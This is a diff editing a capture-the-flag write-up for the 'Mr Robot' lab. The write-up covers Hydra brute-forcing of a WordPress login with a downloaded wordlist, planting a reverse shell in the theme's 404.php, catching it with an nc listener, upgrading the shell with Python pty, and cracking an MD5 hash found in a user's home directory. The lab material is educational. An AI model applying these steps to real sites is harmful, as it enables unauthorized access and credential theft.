@@ -41,9 +41,6 @@ fsocity.dic
 key-1-of-3.txt
 ```
 Now with http://10.10.231.112/key-1-of-3.txt we get the first flag
-```
-073403c8a58a1f80d943455fb30724b9
-```
 
 Visiting https.//10.10.231.112/fsocity.dic we can download a txt file. Presumibely, it's a dictionary file we can use to bruteforce some logins
 
@@ -66,11 +63,12 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-21 22:26:
 [DATA] attacking http-post-form://10.10.33.211:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:invalid username
 [VERBOSE] Resolving addresses ... [VERBOSE] resolving done
 [80][http-post-form] host: 10.10.33.211   login: Elliot   password: password
-'''
+```
 
 We know that a user Elliot exists. Now we can bruteforce the password:
+```
 > hydra -l Elliot -P fsocity.dic 10.10.33.211 -v http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username'
-
+```
 Once we get the password we can log in.
 
 Once logged in, we can gain access to the underlying host by uploading a reverse shell in Appearence -> Editor.  
@@ -78,6 +76,7 @@ Uploading the code in the 404.php, the script will be executed every time the 40
 We have now the reverse shell.
 
 ```
+>nc -lnvp 1234
 listening on [any] 1234 ...
 10.10.37.252: inverse host lookup failed: Unknown host
 connect to [10.9.80.140] from (UNKNOWN) [10.10.37.252] 51988
@@ -95,14 +94,14 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
 
-Navigating in the home of robot, we get a username and hash:
+Navigating in the home of robot, we get a username and a md5 hash:
 ```
 daemon@linux:/home/robot$ cat pass
 cat password.raw-md5 
 robot:c3fcd3d76192e4007dfb496cca67e13b
 ```
 
-We crack it using the CraskStation and we get a password.  
+We crack it using the CraskStation and we get the password.  
 We can use the password to login in robot account.
 
 In /home/robot we also find the second flag.
